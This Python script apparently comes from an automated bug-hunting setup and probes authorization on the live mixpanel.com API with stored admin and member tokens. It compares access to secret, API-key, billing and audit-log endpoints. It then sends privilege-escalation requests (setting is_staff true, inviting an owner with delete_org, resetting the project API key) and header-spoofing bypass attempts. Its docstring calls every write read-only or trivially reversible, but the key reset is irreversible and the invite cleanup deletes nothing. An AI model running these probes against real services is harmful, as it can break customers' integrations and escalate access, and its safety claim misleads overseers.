#!/usr/bin/env python3
"""
authz_runner.py — Authorization policy audit on mixpanel.com

Compares MEMBER vs ADMIN responses for documented elevated-privilege endpoints.
All checks are read-only or trivially-self-reversible writes.
"""
import sys, os, json, time, hashlib, re
sys.path.insert(0, '/home/hunter/new_agent/.claude/lib')
from safe_http import SafeHttp

TARGET = "mixpanel"
TS = int(time.time())
OUT = f"/home/hunter/new_agent/results/mixpanel/authz-{TS}.json"
LOG = f"/home/hunter/new_agent/targets/mixpanel/notes/session-log.md"

sh = SafeHttp(allow_raw_for_waf=True)
tokens = json.load(open(f'/home/hunter/new_agent/targets/{TARGET}/recon/tokens.json'))
ADMIN  = tokens['ADMIN']
MEMBER = tokens['MEMBER']

BASE = "https://mixpanel.com"

def headers_for(role):
    h = dict(role['api_request_headers'])
    h['Accept'] = 'application/json'
    h['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    return h

def log(msg):
    with open(LOG, 'a') as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] AUTHZ-AUDIT: {msg}\n")

def is_login_html(body: str, ctype: str) -> bool:
    if 'json' in ctype.lower():
        return False
    lower = body[:1500].lower()
    triggers = ['<!doctype html', '<html', 'login', 'sign in', 'signin', 'react-root', 'mp-app']
    return any(t in lower for t in triggers)

def body_signature(body: str) -> str:
    # signature ignoring whitespace/CSRF noise — used for equivalence check
    norm = re.sub(r'\s+', '', body)
    return hashlib.sha256(norm.encode('utf-8', errors='ignore')).hexdigest()[:16]

def fetch(role_name, role, method, path, body=None, extra_headers=None):
    url = BASE + path
    h = headers_for(role)
    if extra_headers:
        h.update(extra_headers)
    kwargs = {"headers": h, "timeout": 25}
    if method != "GET" and body is not None:
        kwargs["json_body"] = body
    try:
        # SafeHttp.request signature: method, url, headers=, json_body=
        if method == "GET":
            resp = sh.request("GET", url, headers=h, timeout=25, allow_redirects=False)
        elif method in ("POST", "PATCH", "PUT", "DELETE"):
            resp = sh.request(method, url, headers=h, json_body=body, timeout=25, allow_redirects=False)
        else:
            return {"error": f"unsupported method {method}"}
    except Exception as e:
        return {"error": str(e)[:200]}
    if resp is None:
        return {"error": "no response (waf guard or pacer)"}
    text = resp.text or ""
    return {
        "role": role_name,
        "method": method,
        "path": path,
        "status": resp.status_code,
        "ctype": resp.headers.get('content-type', ''),
        "loc": resp.headers.get('location', ''),
        "len": len(text),
        "first200": text[:200],
        "sig": body_signature(text),
        "is_login_html": is_login_html(text, resp.headers.get('content-type', '')),
        "set_cookie": resp.headers.get('set-cookie', '')[:80],
    }

# ------------------------------------------------------------------ Part A
A_READS = [
    "/api/app/projects/4025962/dashboards",
    "/api/app/projects/4027263/dashboards",
    "/api/app/projects/4027269/dashboards",
    "/api/app/projects/4025923/dashboards",
    "/api/app/projects/4025923/cohorts",
    "/api/app/projects/4025923/bookmarks",
    "/api/app/projects/4025923/webhooks",
    "/api/app/projects/4025923/lookup_tables",
    "/api/app/projects/4025923/custom_alerts",
    "/api/app/projects/4025923/service_accounts",
    "/api/app/projects/4025923/users",
    "/api/app/projects/4025923/info",
    "/api/app/projects/4025923/settings",
    "/api/app/projects/4025923/secret",
    "/api/app/projects/4025923/api-key",
    "/api/app/organizations/3100781",
    "/api/app/organizations/3100781/members",
    "/api/app/organizations/3100781/audit_logs",
    "/api/app/organizations/3100781/billing",
]

results = {"part_a_reads": [], "part_b_writes": [], "part_c_headers": []}

log(f"Starting authz audit — run {TS}, {len(A_READS)} read endpoints")

for path in A_READS:
    a = fetch("ADMIN", ADMIN, "GET", path)
    time.sleep(0.6)
    m = fetch("MEMBER", MEMBER, "GET", path)
    time.sleep(0.6)

    same_status = a.get("status") == m.get("status")
    same_sig = a.get("sig") == m.get("sig")
    member_got_json = "json" in (m.get("ctype") or "").lower()
    admin_got_json = "json" in (a.get("ctype") or "").lower()

    match = (
        m.get("status") == 200
        and member_got_json
        and admin_got_json
        and same_sig
        and not m.get("is_login_html")
    )

    row = {
        "path": path,
        "admin": a,
        "member": m,
        "same_status": same_status,
        "same_sig": same_sig,
        "MATCH": match,
    }
    results["part_a_reads"].append(row)

    tag = "MATCH" if match else ("MEMBER-BLOCKED" if m.get("status") in (401, 403, 404) else "DIFF")
    log(f"A {path}  admin={a.get('status')}/{a.get('len')}  member={m.get('status')}/{m.get('len')}  ctypeM={m.get('ctype','')[:30]}  sig={'==' if same_sig else '!='}  → {tag}")

# ------------------------------------------------------------------ Part B
B_PROBES = []

# B1 — create webhook (read-only by virtue of expected 403; cleanup if needed)
log("B1 — POST /api/app/projects/4025923/webhooks with cohort_id=1 dummy")
wh_admin = fetch("ADMIN", ADMIN, "GET", "/api/app/projects/4025923/webhooks")  # baseline
wh_member_create = fetch("MEMBER", MEMBER, "POST", "/api/app/projects/4025923/webhooks",
                         body={"name": "audit-test-DELETE", "url": "https://example.com/poke", "cohort_id": 1})
B_PROBES.append({"id": "B1_webhook_create_member", "baseline_admin_get": wh_admin, "member_post": wh_member_create})
log(f"B1 member_post status={wh_member_create.get('status')} first200={wh_member_create.get('first200','')[:120]!r}")

# If accepted (2xx) — attempt cleanup
if wh_member_create.get("status") in (200, 201):
    try:
        body_obj = json.loads(wh_member_create.get("first200", "") + "...")
    except Exception:
        body_obj = None
    log(f"B1 WEBHOOK CREATED unexpectedly — attempting cleanup")
    # try to find id in raw response
    full = wh_member_create.get("first200", "")
    m_id = re.search(r'"id"\s*:\s*(\d+)', full)
    if m_id:
        wh_id = m_id.group(1)
        cleanup = fetch("MEMBER", MEMBER, "DELETE", f"/api/app/projects/4025923/webhooks/{wh_id}")
        B_PROBES.append({"id": "B1_cleanup", "delete": cleanup})
        log(f"B1 cleanup DELETE id={wh_id} status={cleanup.get('status')}")

# B2 — PATCH /api/app/me with is_staff:true
log("B2 — PATCH /api/app/me {is_staff:true}")
me_admin_pre = fetch("ADMIN", ADMIN, "GET", "/api/app/me")
me_member_pre = fetch("MEMBER", MEMBER, "GET", "/api/app/me")
admin_patch = fetch("ADMIN", ADMIN, "PATCH", "/api/app/me", body={"is_staff": True})
member_patch = fetch("MEMBER", MEMBER, "PATCH", "/api/app/me", body={"is_staff": True})
me_admin_post = fetch("ADMIN", ADMIN, "GET", "/api/app/me")
me_member_post = fetch("MEMBER", MEMBER, "GET", "/api/app/me")
B_PROBES.append({
    "id": "B2_patch_me_is_staff",
    "admin_pre": me_admin_pre,
    "admin_patch": admin_patch,
    "admin_post": me_admin_post,
    "member_pre": me_member_pre,
    "member_patch": member_patch,
    "member_post": me_member_post,
})
log(f"B2 admin_patch={admin_patch.get('status')}  member_patch={member_patch.get('status')}  member_pre==post sig: {me_member_pre.get('sig')==me_member_post.get('sig')}")

# B3 — invite user to org with elevated role
log("B3 — POST /api/app/organizations/3100781/users invite owner")
inv_payload = {"email": "audit-test-noreply@example.com", "role": "owner", "permissions": ["delete_org"]}
inv_member = fetch("MEMBER", MEMBER, "POST", "/api/app/organizations/3100781/users", body=inv_payload)
B_PROBES.append({"id": "B3_invite_user_member", "member_post": inv_member})
log(f"B3 member_post status={inv_member.get('status')} first200={inv_member.get('first200','')[:120]!r}")
# Cleanup if accepted: GET invites list and DELETE
if inv_member.get("status") in (200, 201):
    log("B3 ACCEPTED — attempting cleanup")
    invites_list = fetch("MEMBER", MEMBER, "GET", "/api/app/organizations/3100781/users")
    B_PROBES.append({"id": "B3_post_invites_list", "list": invites_list})

# B4 — reset api key
log("B4 — POST /api/app/projects/4025923/reset_api_key (MEMBER only, single probe)")
reset_member = fetch("MEMBER", MEMBER, "POST", "/api/app/projects/4025923/reset_api_key", body={})
B_PROBES.append({"id": "B4_reset_api_key_member", "member_post": reset_member})
log(f"B4 member_post status={reset_member.get('status')} first200={reset_member.get('first200','')[:120]!r}")

results["part_b_writes"] = B_PROBES

# ------------------------------------------------------------------ Part C
log("C — header context manipulation")
c1_member = fetch("MEMBER", MEMBER, "GET", "/api/app/projects/4025962/dashboards",
                  extra_headers={"X-Mixpanel-Org-Role": "admin"})
c1_admin = fetch("ADMIN", ADMIN, "GET", "/api/app/projects/4025962/dashboards")
c2_member = fetch("MEMBER", MEMBER, "GET", "/api/app/projects/4025962/dashboards",
                  extra_headers={"X-Original-URL": "/api/app/projects/4025923/dashboards"})
results["part_c_headers"] = [
    {"id": "C1_x_mixpanel_org_role_admin", "member": c1_member, "admin": c1_admin,
     "MATCH": c1_member.get("sig") == c1_admin.get("sig") and "json" in c1_member.get("ctype","")},
    {"id": "C2_x_original_url", "member": c2_member,
     "REACHED_TARGET": "json" in c2_member.get("ctype","") and c2_member.get("status") == 200 and not c2_member.get("is_login_html")},
]
log(f"C1 member={c1_member.get('status')} admin={c1_admin.get('status')} sig_match={c1_member.get('sig')==c1_admin.get('sig')}")
log(f"C2 member={c2_member.get('status')} ctype={c2_member.get('ctype','')[:30]} is_html_login={c2_member.get('is_login_html')}")

json.dump(results, open(OUT, "w"), indent=2)
print(f"Saved to {OUT}")
log(f"Audit complete — saved {OUT}")
